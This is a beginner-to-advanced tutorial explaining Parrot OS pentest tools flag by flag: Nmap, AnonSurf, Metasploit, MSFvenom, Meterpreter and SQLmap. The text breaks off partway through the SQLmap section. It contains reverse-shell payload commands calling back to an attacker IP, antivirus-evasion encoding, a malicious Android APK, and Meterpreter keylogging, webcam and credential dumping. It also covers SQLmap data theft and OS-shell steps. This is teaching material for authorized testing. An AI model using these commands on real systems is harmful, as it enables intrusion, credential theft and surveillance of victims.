# 🦜 Parrot OS — Every Command Explained: What It Does, Why You Use It & What It Can Do

> **Purpose:** Every single tool command broken down — flag by flag, use case by use case
> **Level:** Complete beginner → Advanced
> **Style:** Learn WHY each flag exists, not just HOW to type it
> **⚠️ Legal:** Authorized testing and education ONLY

---

## 📋 Table of Contents

1. [How to Read This Guide](#how-to-read-this-guide)
2. [NMAP — Network Mapper](#2-nmap--network-mapper)
3. [AnonSurf — Anonymization](#3-anonsurf--anonymization)
4. [Metasploit Framework](#4-metasploit-framework)
5. [MSFvenom — Payload Generator](#5-msfvenom--payload-generator)
6. [Meterpreter — Advanced Shell](#6-meterpreter--advanced-shell)
7. [SQLmap — SQL Injection](#7-sqlmap--sql-injection)
8. [Burp Suite — Web Proxy](#8-burp-suite--web-proxy)
9. [Gobuster — Directory Brute Force](#9-gobuster--directory-brute-force)
10. [Aircrack-ng Suite — Wi-Fi Auditing](#10-aircrack-ng-suite--wi-fi-auditing)
11. [Hashcat — Hash Cracking](#11-hashcat--hash-cracking)
12. [John the Ripper — Password Cracking](#12-john-the-ripper--password-cracking)
13. [Hydra — Online Brute Force](#13-hydra--online-brute-force)
14. [Wireshark / tshark — Packet Analysis](#14-wireshark--tshark--packet-analysis)
15. [Netcat — Swiss Army Knife](#15-netcat--swiss-army-knife)
16. [Bettercap — Network Attacks](#16-bettercap--network-attacks)
17. [Responder — Credential Capture](#17-responder--credential-capture)
18. [Impacket Suite — Windows/AD Attacks](#18-impacket-suite--windowsad-attacks)
19. [BloodHound — AD Mapping](#19-bloodhound--ad-mapping)
20. [Nikto — Web Server Scanner](#20-nikto--web-server-scanner)
21. [theHarvester — OSINT](#21-theharvester--osint)
22. [Proxychains4 — Traffic Routing](#22-proxychains4--traffic-routing)
23. [Netexec — Windows Network](#23-netexec--windows-network)
24. [Weevely — Web Shell](#24-weevely--web-shell)
25. [Wifite — Automated Wi-Fi](#25-wifite--automated-wi-fi)
26. [Maltego — OSINT Visualization](#26-maltego--osint-visualization)
27. [YARA — Pattern Matching](#27-yara--pattern-matching)
28. [Volatility — Memory Forensics](#28-volatility--memory-forensics)
29. [Binwalk — Firmware Analysis](#29-binwalk--firmware-analysis)
30. [Ghidra — Reverse Engineering](#30-ghidra--reverse-engineering)
31. [Rizin / Cutter — Binary Analysis](#31-rizin--cutter--binary-analysis)
32. [Mimikatz — Credential Dumping](#32-mimikatz--credential-dumping)
33. [LinPEAS / WinPEAS — Privilege Escalation](#33-linpeas--winpeas--privilege-escalation)
34. [SSH — Secure Shell](#34-ssh--secure-shell)
35. [GPG / Cryptography](#35-gpg--cryptography)
36. [Git — Version Control](#36-git--version-control)
37. [Python3 — Scripting](#37-python3--scripting)
38. [Linux Essential Commands](#38-linux-essential-commands)
39. [Complete Attack Flow Examples](#39-complete-attack-flow-examples)
40. [Command Quick Reference Card](#40-command-quick-reference-card)

---

## How to Read This Guide

Every command follows this format:

```
command [flags] [target]
         │
         ├─ FLAG: what the flag literally means
         ├─ WHY: why you would use it
         ├─ WHAT IT DOES: exactly what happens when you run it
         └─ EXAMPLE OUTPUT: what you'll see
```

**Understanding flag notation:**
```
-x     → Short flag (single dash + single letter)
--word → Long flag (double dash + full word)
TARGET → The IP, URL, file, or domain you're targeting
[...]  → Optional parameter
<...>  → Required parameter
```

---

## 2. NMAP — Network Mapper

**What is Nmap?**
Nmap sends specially crafted packets to a target and analyzes the responses to discover:
- Which computers are alive on a network
- Which ports are open on those computers
- What software/version is running on those ports
- What operating system the target is running

**Think of it like this:** Nmap is like ringing every doorbell in a neighborhood. If someone answers, that port is "open." If no one answers, the port is "closed." If a guard blocks you, it's "filtered."

---

### 📡 NMAP SCAN TYPES — What Each Does

```bash
nmap -sS target
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `-sS` | **SYN Scan** (Stealth Scan) | Sends SYN packet, gets SYN-ACK back, but never completes the handshake. Never logs a full connection — stealthier than full TCP connect. Requires root/sudo. |

```
How it works:
Attacker → SYN packet → Target port
Target   → SYN-ACK    → Port is OPEN
Attacker → RST packet → (breaks connection before logging)
Result: Port discovered, but never fully connected = harder to detect in logs
```

---

```bash
nmap -sT target
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `-sT` | **TCP Connect Scan** | Completes the full 3-way handshake. Slower, more detectable, but doesn't need root. Use when you can't use -sS (no root privileges). |

---

```bash
nmap -sU target
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `-sU` | **UDP Scan** | Scans UDP ports instead of TCP. DNS(53), SNMP(161), DHCP(67/68) are UDP. Very slow because UDP has no response for closed ports — nmap must wait for timeout. |

---

```bash
nmap -sn 192.168.1.0/24
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `-sn` | **Ping Scan** (No port scan) | Just checks which hosts are alive. Sends ICMP echo, TCP SYN to port 443, TCP ACK to port 80. Much faster — use first to find live hosts, then scan those specifically. |
| `192.168.1.0/24` | **CIDR notation** | Scans entire /24 subnet (256 hosts: .0 to .255) |

**Real example output:**
```
Nmap scan report for 192.168.1.1    ← Router — alive
Nmap scan report for 192.168.1.50   ← Some device — alive
Nmap scan report for 192.168.1.100  ← Your target — alive
```

---

### 📡 NMAP PORT FLAGS — Choosing What to Scan

```bash
nmap -p 80 target
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `-p 80` | **Scan only port 80** | When you already know which port you want. Faster than scanning all ports. |

```bash
nmap -p 80,443,8080,8443 target
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `-p 80,443,...` | **Scan specific ports** | List the exact ports you care about — common web ports in this case |

```bash
nmap -p 1-1000 target
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `-p 1-1000` | **Scan port range** | Scan first 1000 ports (covers most common services) |

```bash
nmap -p- target
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `-p-` | **Scan ALL 65535 ports** | The `-` means "to the end." Never miss a service hiding on a non-standard port. Takes longer but thorough. Essential in real pentests. |

```bash
nmap -F target
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `-F` | **Fast scan** (top 100 ports) | Scans only the 100 most common ports. Quick reconnaissance when time is limited. |

---

### 📡 NMAP DETECTION FLAGS — Finding What's Running

```bash
nmap -sV target
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `-sV` | **Service/Version Detection** | Probes open ports to determine what software is running and what version. Example: port 22 running "OpenSSH 8.2p1" — knowing the exact version lets you search for known CVEs. |

**Output example:**
```
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp  open  http    Apache httpd 2.4.41
3306/tcp open mysql   MySQL 5.7.33
```
Now you know: Apache 2.4.41 has CVE-2021-41773, MySQL 5.7.33 has privilege escalation bugs.

---

```bash
nmap -O target
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `-O` | **OS Detection** | Analyzes TCP/IP fingerprint (TTL values, window size, sequence numbers) to guess the OS. Helps target OS-specific exploits. |

**Output example:**
```
OS details: Linux 4.15 - 5.6
OR
OS details: Windows 10 1903-2004
```

---

```bash
nmap -sC target
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `-sC` | **Default Script Scan** | Runs Nmap's built-in NSE (Nmap Scripting Engine) default scripts. These are "safe" scripts that gather extra info: HTTP headers, SSL cert details, SMB shares, FTP banners, DNS info, etc. |

**What default scripts do:**
```
http-title       → Get webpage title
ssl-cert         → Show SSL certificate details
ssh-hostkey      → Show SSH host keys
smb-security-mode → Check SMB signing status
ftp-anon         → Check if FTP allows anonymous login
smtp-commands    → List SMTP commands
dns-recursion    → Check if DNS allows recursion
```

---

```bash
nmap -A target
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `-A` | **Aggressive Scan** | Combines: -sV (versions) + -O (OS) + -sC (default scripts) + --traceroute. One flag = all the good information. Noisier but comprehensive. |

---

### 📡 NMAP TIMING FLAGS — Speed vs Stealth

```bash
nmap -T0 target    # Paranoid
nmap -T1 target    # Sneaky
nmap -T2 target    # Polite
nmap -T3 target    # Normal (default)
nmap -T4 target    # Aggressive
nmap -T5 target    # Insane
```

| Flag | Name | Speed | Delay Between Probes | Use When |
|------|------|-------|---------------------|----------|
| `-T0` | Paranoid | Extremely slow | 5 minutes | Evading IDS — one packet every 5 min |
| `-T1` | Sneaky | Very slow | 15 seconds | Avoiding detection |
| `-T2` | Polite | Slow | 0.4 seconds | Not disrupting network |
| `-T3` | Normal | Medium | Default | Normal use |
| `-T4` | Aggressive | Fast | Minimal | CTFs, controlled environments |
| `-T5` | Insane | Maximum | None | Fast LANs, don't care about accuracy |

**Real advice:** Use `-T4` for HTB/TryHackMe. Use `-T2` on real engagements.

---

### 📡 NMAP NSE SCRIPTS — Automated Checks

```bash
nmap --script=vuln target
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `--script=vuln` | **Run vulnerability scripts** | Runs all scripts in the "vuln" category — checks for known CVEs, dangerous misconfigurations, and exploitable weaknesses automatically. |

```bash
nmap --script=http-enum target
```
Finds hidden web directories by brute-forcing common paths.

```bash
nmap --script=smb-vuln-ms17-010 target
```
Specifically checks if target is vulnerable to EternalBlue (WannaCry ransomware exploit).

```bash
nmap --script=ftp-anon target
```
Tests if FTP server allows anonymous login — huge security issue.

```bash
nmap --script=ssh-brute --script-args userdb=users.txt,passdb=passwords.txt target
```
Brute-forces SSH login with custom wordlists.

---

### 📡 NMAP OUTPUT FLAGS — Saving Results

```bash
nmap -oN scan.txt target      # Normal (human-readable)
nmap -oX scan.xml target      # XML (for tools like Metasploit)
nmap -oG scan.gnmap target    # Grepable (for grep/awk scripts)
nmap -oA scan target          # ALL three formats simultaneously
```

| Flag | Format | Use When |
|------|--------|----------|
| `-oN` | Normal text | Reading results yourself |
| `-oX` | XML | Importing into Metasploit (`db_import`) or reporting tools |
| `-oG` | Grepable | Scripting: `grep "open" scan.gnmap` |
| `-oA` | All formats | Always use this — saves all three at once |

---

### 📡 NMAP EVASION FLAGS — Avoiding Detection

```bash
nmap -f target
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `-f` | **Fragment packets** | Splits packets into 8-byte fragments. Some firewalls/IDS can't reassemble and miss the scan. |

```bash
nmap -D RND:10 target
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `-D RND:10` | **Decoy scan** | Generates 10 random fake source IPs alongside your real one. IDS sees 11 sources and can't determine which is the real attacker. |

```bash
nmap -Pn target
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `-Pn` | **Skip host discovery (ping)** | Assumes host is up and skips ping. Use when target blocks ICMP ping — many servers/firewalls block ping, but ports may still be open. |

```bash
nmap --min-rate 5000 target
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `--min-rate 5000` | **Minimum packet rate** | Send at least 5000 packets/sec. Dramatically speeds up full port scan (`-p-`). |

---

### 🎯 NMAP COMPLETE EXAMPLES EXPLAINED

```bash
# EXAMPLE 1: Quick recon
nmap -sV -sC -T4 10.10.10.100
# WHY: Fast scan (-T4), finds service versions (-sV), runs default info scripts (-sC)
# WHAT YOU GET: Open ports, software versions, basic vulnerability hints
# USE WHEN: Starting any CTF or pentest

# EXAMPLE 2: Full thorough scan
sudo nmap -sS -sV -sC -O -p- --min-rate 5000 -oA full_scan 10.10.10.100
# WHY: 
#   -sS       = stealthy SYN scan
#   -sV       = find exactly what software/version
#   -sC       = run info-gathering scripts
#   -O        = detect OS
#   -p-       = scan ALL 65535 ports (find hidden services)
#   --min-rate 5000 = fast (5000 packets/sec minimum)
#   -oA full_scan = save all output formats
# USE WHEN: Thorough pentest, after quick scan found interesting ports

# EXAMPLE 3: Stealth scan for IDS evasion
sudo nmap -sS -T1 -f -D RND:5 --data-length 20 10.10.10.100
# WHY:
#   -T1       = very slow (15s between probes)
#   -f        = fragment packets
#   -D RND:5  = 5 decoy IPs
#   --data-length 20 = add random data to packets (looks more normal)
# USE WHEN: Real engagement where stealth is critical

# EXAMPLE 4: Find all live hosts then scan them
nmap -sn 192.168.1.0/24 -oG hosts.txt           # Find live hosts
grep "Up" hosts.txt | awk '{print $2}' > live.txt # Extract IPs
nmap -iL live.txt -sV -p 22,80,443,3389          # Scan only those hosts
# WHY: Don't waste time scanning dead hosts
# USE WHEN: Large network reconnaissance
```

---

## 3. AnonSurf — Anonymization

**What is AnonSurf?**
AnonSurf routes ALL your system's internet traffic through the Tor network using iptables rules. Every app — browser, terminal, Metasploit — sends traffic through Tor's relay chain. Your real IP becomes invisible to any destination.

```bash
sudo anonsurf start
```
| Part | Meaning | What Happens |
|------|---------|-------------|
| `sudo` | Run as root | iptables rules require root to modify |
| `anonsurf` | The tool | Parrot's built-in anonymization wrapper |
| `start` | Action | Modifies iptables to redirect ALL traffic through Tor SOCKS proxy on port 9050. Starts Tor daemon. Switches DNS to anonymous servers. |

**What happens internally:**
```
Before start: YourPC → Internet (your real IP visible)

After start:  YourPC → Tor Guard Node → Tor Relay Node → Tor Exit Node → Internet
                        (encrypted)      (encrypted)      (knows dest, not you)
Your real IP is NEVER visible to destination
```

---

```bash
sudo anonsurf stop
```
What it does: Removes all iptables redirections. Stops Tor daemon. Returns DNS to system default. Traffic flows normally again.

---

```bash
sudo anonsurf changeid
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `changeid` | **Change Tor identity** | Sends NEWNYM signal to Tor — gets you a completely new circuit (new entry/relay/exit nodes). Your apparent IP address changes. Use when you want to appear as a different location. |

---

```bash
sudo anonsurf myip
```
What it does: Makes a request through Tor to an IP-checking service. Shows your current apparent public IP. Should show a Tor exit node IP, NOT your real IP. If it shows your real IP → AnonSurf isn't working.

---

```bash
sudo anonsurf status
```
Shows: Whether Tor is running, your Tor IP, iptables redirect status, DNS status.

**When to use AnonSurf:**
- Researching targets without revealing your location
- During authorized reconnaissance phases
- Protecting identity while doing OSINT
- **NOT for:** Actual attacks (Tor is too slow for exploitation, and exit nodes can be monitored)

---

## 4. Metasploit Framework

**What is Metasploit?**
Metasploit is a framework — a collection of tools, exploits, payloads, and post-exploitation modules that work together. Think of it as a "hacking operating system within Linux." It has over 2,000 exploits and 500+ payloads.

**Core concepts you MUST understand:**
```
EXPLOIT     → Code that takes advantage of a vulnerability in target software
PAYLOAD     → Code that runs ON THE TARGET after the exploit succeeds
              (reverse shell, Meterpreter, command execution, etc.)
MODULE      → Any piece of code in Metasploit (exploit, auxiliary, post, etc.)
SESSION     → An active connection to a compromised target
METERPRETER → Advanced payload that gives full control over target
RHOSTS      → Remote HOST(S) = the TARGET(S) you're attacking
LHOST       → Local HOST = YOUR machine's IP (attacker)
LPORT       → Local PORT = port YOUR machine listens on for reverse connection
```

---

### 💀 MSFCONSOLE — Core Commands Explained

```bash
msfconsole
```
What it does: Starts the Metasploit console. Loads all modules from /usr/share/metasploit-framework/. Connects to PostgreSQL database if running.

```bash
msfconsole -q
```
| Flag | Meaning | Why Use It |
|------|---------|-----------|
| `-q` | Quiet mode | Skips the ASCII art banner and version info. Loads faster. Use when you're in a hurry or scripting. |

---

```bash
search eternalblue
search ms17-010
search type:exploit platform:windows
search name:smb type:auxiliary
```
| Part | Meaning | What It Does |
|------|---------|-------------|
| `search` | Search command | Searches all module names, descriptions, CVE numbers, and references |
| `eternalblue` | Search term | Finds all modules related to EternalBlue (NSA exploit, MS17-010) |
| `type:exploit` | Filter by type | Only show exploit modules (not auxiliaries, payloads, etc.) |
| `platform:windows` | Filter by OS | Only show Windows exploits |

**Output:**
```
#  Name                                  Disclosure Date  Rank    Description
-  ----                                  ---------------  ----    -----------
0  exploit/windows/smb/ms17_010_eternalblue 2017-03-14  excellent EternalBlue SMB RCE
```
The `#` number = module index (can use `use 0` instead of typing full path)

---

```bash
use exploit/windows/smb/ms17_010_eternalblue
# OR shortcut:
use 0
```
| Part | Meaning | What Happens |
|------|---------|-------------|
| `use` | Load a module | Switches context to that module. Prompt changes to `msf6 exploit(ms17_010_eternalblue) >` |
| Full path | Module location | `exploit/` = category, `windows/smb/` = OS/protocol, `ms17_010_eternalblue` = module name |

---

```bash
show options
```
What it does: Shows all configurable options for the current module. Critical ones marked as **Required: yes**. You MUST set all required options before running.

**Example output:**
```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Required  Current Setting  Description
   ----           --------  ---------------  -----------
   RHOSTS         yes                        Target address(es)
   RPORT          yes       445              SMB port (default 445)
   SMBDomain      no                         Windows domain
   SMBPass        no                         SMB password
   SMBUser        no                         SMB username

Payload options (windows/x64/meterpreter/reverse_tcp):
   LHOST          yes                        Your attacker IP
   LPORT          yes       4444             Listener port
```

---

```bash
set RHOSTS 10.10.10.40
set LHOST 10.10.14.5
set LPORT 4444
```
| Part | Meaning | Why It Matters |
|------|---------|---------------|
| `set` | Set a variable | Configures a module option for THIS module only |
| `RHOSTS` | Remote hosts | The target IP. Can be a single IP, range (10.10.10.1-254), CIDR (10.10.10.0/24), or file (/tmp/hosts.txt) |
| `LHOST` | Local host | YOUR IP — the target will connect BACK to this. Must be your VPN IP (tun0) if attacking via VPN |
| `LPORT` | Local port | Port to listen on for reverse connection. 4444 is default but change it to avoid detection |

```bash
setg LHOST 10.10.14.5
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `setg` | Set GLOBALLY | Sets option for ALL modules, not just current. Saves typing LHOST for every module. Use after first setting up your session. |

---

```bash
show payloads
```
What it does: Lists ALL payloads compatible with the current exploit. Different payloads do different things after the exploit succeeds.

**Key payload types:**
```
windows/x64/shell/reverse_tcp         → Basic cmd.exe shell (connects back to you)
windows/x64/meterpreter/reverse_tcp   → Meterpreter (advanced, most features)
windows/x64/meterpreter/reverse_https → Meterpreter over HTTPS (harder to detect)
cmd/unix/reverse_bash                  → Bash shell (for Linux targets)
linux/x64/meterpreter/reverse_tcp     → Linux Meterpreter
```

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```
WHY this specific payload: Meterpreter runs in memory (no file on disk), encrypted communication, loads of features (keylogger, screenshot, file transfer, privilege escalation).

---

```bash
run
# OR:
exploit
```
What it does: Executes the exploit against RHOSTS using configured payload. Waits for target to connect back on LPORT.

```bash
exploit -j
```
| Flag | Meaning | Why Use It |
|------|---------|-----------|
| `-j` | Run as background job | Keeps running in background. Lets you use console for other things. Session opens automatically when target connects. |

```bash
exploit -z
```
| Flag | Meaning | Why Use It |
|------|---------|-----------|
| `-z` | Don't interact with session | Exploit runs, session opens, but you stay in console. Use `sessions -i ID` to interact later. |

---

```bash
sessions
sessions -l
```
What it does: Lists all active sessions (compromised machines currently connected).

**Output:**
```
Id  Name  Type                     Info
--  ----  ----                     ----
1         meterpreter x64/windows  VICTIM\Administrator @ VICTIM
2         shell cmd/unix            
```

```bash
sessions -i 1
```
| Part | Meaning | What Happens |
|------|---------|-------------|
| `-i 1` | Interact with session 1 | Connects you to that compromised machine's Meterpreter/shell |

```bash
sessions -k 1
```
Kill (close) session 1 — terminates connection to target.

```bash
sessions -u 1
```
Upgrade a basic shell (session 1) to Meterpreter — very useful when you got a simple reverse shell and want more features.

---

```bash
background
# OR: Ctrl+Z
```
What it does: Sends current Meterpreter session to background. Returns you to msfconsole. Session stays alive. Use `sessions -i ID` to return.

---

```bash
info
```
Shows detailed information about current module: author, description, CVE references, required conditions, reliability rating, and DEMO usage.

```bash
check
```
Some modules support this — checks if the target IS vulnerable WITHOUT actually exploiting it. Safer for checking multiple targets.

---

### 💀 DATABASE COMMANDS — Organizing Your Pentest

```bash
workspace -a ClientName2025
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `workspace` | Manage workspaces | Different namespaces for different engagements. Like folders. |
| `-a ClientName2025` | Add (create) new workspace | Creates a fresh empty workspace. All hosts/services/creds stored separately. |

```bash
db_nmap -sV -sC -p- 10.10.10.40
```
| Part | Meaning | What Happens |
|------|---------|-------------|
| `db_nmap` | Nmap + database | Runs Nmap AND automatically stores results in Metasploit database. Can then use `hosts` and `services` to query results. |

```bash
hosts
```
Shows all discovered hosts stored in database from db_nmap scans.

```bash
services
```
Shows all discovered services (port, protocol, service name, version) from db_nmap.

```bash
vulns
```
Shows all vulnerabilities found/confirmed against targets.

```bash
creds
```
Shows all captured credentials (usernames, passwords, hashes).

```bash
loot
```
Shows all captured data (password dumps, config files, etc.)

---

## 5. MSFvenom — Payload Generator

**What is MSFvenom?**
MSFvenom creates standalone payload files (executables, scripts, shellcode) that you deliver to a target to gain a reverse shell or Meterpreter session. It's the "create the weapon" step before exploitation.

```bash
msfvenom -l payloads
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `-l payloads` | List all payloads | Shows every available payload. Use to find the right one for your target OS. |

```bash
msfvenom -l formats
```
Lists all output formats: exe, elf, php, asp, raw, py, rb, bash, etc.

---

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
          LHOST=10.10.14.5 \
          LPORT=4444 \
          -f exe \
          -o shell.exe
```

| Part | Meaning | Why |
|------|---------|-----|
| `-p windows/x64/meterpreter/reverse_tcp` | **Payload** | The code that will run on victim. `windows/x64` = Windows 64-bit. `meterpreter` = advanced shell type. `reverse_tcp` = victim connects BACK to you (bypasses inbound firewall rules) |
| `LHOST=10.10.14.5` | **Your IP** | Victim's payload will call home to THIS address. Use your VPN/tun0 IP. |
| `LPORT=4444` | **Your port** | Which port on YOUR machine to listen on for incoming connection |
| `-f exe` | **Output format** | Create a Windows .exe file |
| `-o shell.exe` | **Output file name** | Save the payload as shell.exe |

---

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
          LHOST=10.10.14.5 LPORT=4444 \
          -f elf -o shell.elf
```
WHY `elf`: ELF is Linux/Unix executable format. Same as .exe for Windows.

```bash
chmod +x shell.elf    # Make it executable
./shell.elf           # Run on victim Linux machine
```

---

```bash
msfvenom -p php/meterpreter/reverse_tcp \
          LHOST=10.10.14.5 LPORT=4444 \
          -f raw -o shell.php
```
WHY `php`: When you find a file upload vulnerability on a web server running PHP. Upload this file, access it via browser → get shell.

---

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
          LHOST=10.10.14.5 LPORT=4444 \
          -e x64/xor_dynamic \
          -i 10 \
          -f exe -o encoded_shell.exe
```

| Part | Meaning | Why |
|------|---------|-----|
| `-e x64/xor_dynamic` | **Encoder** | XOR-encodes the payload. Changes the byte signature so antivirus doesn't recognize it as known malware. |
| `-i 10` | **Iterations** | Encode 10 times (each pass changes signature further). More iterations = harder to detect by signature. |

---

```bash
msfvenom -p android/meterpreter/reverse_tcp \
          LHOST=10.10.14.5 LPORT=4444 \
          -o evil_app.apk
```
WHY: Creates a malicious Android APK. When installed on Android device → gives you Meterpreter with access to camera, GPS, SMS, calls. **Authorized testing of mobile devices only.**

---

## 6. Meterpreter — Advanced Shell

**What is Meterpreter?**
Meterpreter is NOT a regular shell. It's an advanced post-exploitation agent that:
- Runs entirely in MEMORY (no file written to disk by default)
- Communicates over encrypted channel (TCP/HTTPS)
- Can load additional modules dynamically
- Has 100+ built-in commands for every post-exploitation need

```bash
sysinfo
```
WHY: First command after getting Meterpreter. Shows: Computer name, OS, architecture, logged-in user, language, timezone. Confirms you're on the right machine and tells you what OS attacks to use.

```bash
getuid
```
WHY: Shows your current user account. `Server username: NT AUTHORITY\SYSTEM` = you have maximum Windows privileges. `VICTIM\user` = regular user, need privilege escalation.

```bash
getsystem
```
WHY: Automatically attempts multiple privilege escalation techniques to get SYSTEM privileges. Tries: Named Pipe Impersonation, Token Duplication, Service Exploitation. If successful: `...got system via technique X`.

```bash
getpid
```
Shows which process Meterpreter is currently running inside. Important for staying hidden.

```bash
ps
```
WHY: Lists ALL running processes with PID, name, path, user. Used to find a stable process to migrate into (like explorer.exe) or identify interesting processes (lsass.exe for password dumping).

```bash
migrate 1234
```
| Part | Meaning | Why Critical |
|------|---------|-------------|
| `migrate` | Move to another process | Meterpreter moves itself into another running process (by PID). WHY: If victim closes the app your payload is in (e.g., Word document), session dies. Migrate to stable process like `explorer.exe` (always running). Also: migrate to 64-bit process if you're in 32-bit. |

---

```bash
hashdump
```
WHY: Dumps Windows SAM database — extracts NTLM password hashes for ALL local users. These hashes can be: cracked with hashcat/john, or used directly in Pass-the-Hash attacks without cracking.

**Output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```
Format: `username:RID:LM_hash:NTLM_hash`

---

```bash
load kiwi
```
WHY: Loads Kiwi module (Mimikatz ported to Meterpreter). Allows extracting plaintext passwords from Windows memory — extremely powerful.

```bash
creds_all
```
After loading kiwi: Dumps ALL credential types at once — plaintext passwords, NTLM hashes, Kerberos tickets.

---

```bash
upload /home/user/tool.exe C:\\Windows\\Temp\\tool.exe
```
| Part | Meaning |
|------|---------|
| `upload` | Transfer file FROM attacker TO victim |
| `/home/user/tool.exe` | File on YOUR (attacker) machine |
| `C:\\Windows\\Temp\\tool.exe` | Destination on VICTIM machine (note double backslash) |

WHY: Upload privilege escalation tools, additional payloads, or any file needed on victim.

```bash
download C:\\Users\\Admin\\Documents\\passwords.txt /tmp/
```
WHY: Download interesting files FROM victim TO your machine for offline analysis.

---

```bash
shell
```
WHY: Drops from Meterpreter into a raw system shell (cmd.exe on Windows, bash on Linux). Use for commands not in Meterpreter, or when you need to run native OS commands.

```bash
exit
```
Returns from system shell back to Meterpreter.

---

```bash
screenshot
```
WHY: Takes a screenshot of victim's current screen. Shows what they're doing right now — running applications, open documents, browser activity.

```bash
webcam_list
webcam_snap
webcam_stream
```
WHY: Lists, captures a photo from, or streams live video from victim's webcam. **Extremely sensitive capability — authorized testing only.**

```bash
keyscan_start
keyscan_dump
keyscan_stop
```
WHY: Starts a keylogger in the victim's current process. Records every keystroke. `dump` retrieves logged keystrokes — captures passwords, messages, searches.

---

```bash
run post/multi/recon/local_exploit_suggester
```
WHY: Runs a post-exploitation module that checks the victim system for LOCAL privilege escalation opportunities. Suggests specific Metasploit modules to try for getting SYSTEM from a regular user.

```bash
run post/windows/gather/credentials/credential_collector
```
WHY: Collects credentials from common Windows credential stores (browser passwords, saved RDP passwords, etc.)

```bash
portfwd add -l 3389 -p 3389 -r 192.168.1.100
```
| Part | Meaning | Why Use It |
|------|---------|-----------|
| `portfwd` | Port forwarding via Meterpreter | Creates a tunnel through the compromised machine |
| `-l 3389` | Local port (on attacker) | Port to listen on YOUR machine |
| `-p 3389` | Remote port | Port on the target internal machine |
| `-r 192.168.1.100` | Remote host | Internal machine you can now reach THROUGH the compromised host |
WHY: After compromising an internet-facing server, you can reach internal machines not directly accessible from internet.

---

## 7. SQLmap — SQL Injection

**What is SQL Injection?**
When a web application puts user input directly into a SQL query without sanitizing it, an attacker can break out of the intended query and run their own SQL commands. SQLmap automates finding and exploiting these flaws.

```bash
sqlmap -u "http://target.com/page?id=1"
```
| Part | Meaning | What Happens |
|------|---------|-------------|
| `-u` | URL flag | The target URL with a parameter to test |
| `"http://...?id=1"` | URL with parameter | `id=1` is the GET parameter SQLmap will test for injection. It tries injecting payloads like `id=1'`, `id=1 AND 1=1--`, etc. |

---

```bash
sqlmap -u "http://target.com/page?id=1" --dbs
```
| Flag | Meaning | WHY & What You Get |
|------|---------|-------------------|
| `--dbs` | Enumerate databases | After confirming injection, lists ALL database names on the server. From here you choose which DB to dig into. |

```bash
sqlmap -u "http://..." -D database_name --tables
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-D database_name` | Specify database | Target this specific database |
| `--tables` | List tables | Shows all table names — look for `users`, `accounts`, `passwords`, `admin` |

```bash
sqlmap -u "http://..." -D database_name -T users --columns
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-T users` | Target table `users` | Focus on users table |
| `--columns` | List columns | Shows column names: `id`, `username`, `password`, `email` — confirms what data is there |

```bash
sqlmap -u "http://..." -D database_name -T users -C username,password --dump
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-C username,password` | Target columns | Only extract these specific columns (faster) |
| `--dump` | EXTRACT the data | Actually retrieves the data. You get ALL usernames and password hashes from the users table. |

---

```bash
sqlmap -u "http://target.com/login" \
       --data="username=admin&password=test" \
       --method=POST
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `--data="..."` | POST body data | For login forms that use POST method. Tests the username/password fields for injection. |
| `--method=POST` | HTTP method | Explicitly set POST (sometimes auto-detected) |

---

```bash
sqlmap -u "http://target.com/dashboard" \
       --cookie="session=abc123def456"
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `--cookie` | Send session cookie | If the vulnerable page requires login, include your session cookie so SQLmap can access it. Get cookie from browser developer tools after logging in. |

---

```bash
sqlmap -u "http://target.com/page?id=1" --os-shell
```
| Flag | Meaning | WHY (Powerful!) |
|------|---------|----------------|
| `--os-shell` | Get operating system shell | If database user has FILE privileges, SQLmap writes a web shell to the server and gives you command execution. From SQL injection → full OS shell. |

```bash
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
```
WHY: Reads any file from the server filesystem (if DB has FILE privilege). `/etc/passwd` reveals all system users.

---

```bash
sqlmap -u "http://target.com/page?id=1" \
       --level=5 \
       --risk=3
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `--level=5` | Test aggressiveness (1-5) | Level 5 tests more injection points: cookies, referrer, user-agent. Default is 1 (GET/POST params only) |
| `--risk=3` | Risk of harm (1-3) | Risk 3 enables heavy time-based injection and UPDATE/INSERT injections. May modify database data. Default is 1 (safe). |

---

```bash
sqlmap -u "http://target.com/page?id=1" \
       --tamper=space2comment \
       --random-agent
```
| Flag | Meaning | WHY |
|------|---------|-----|
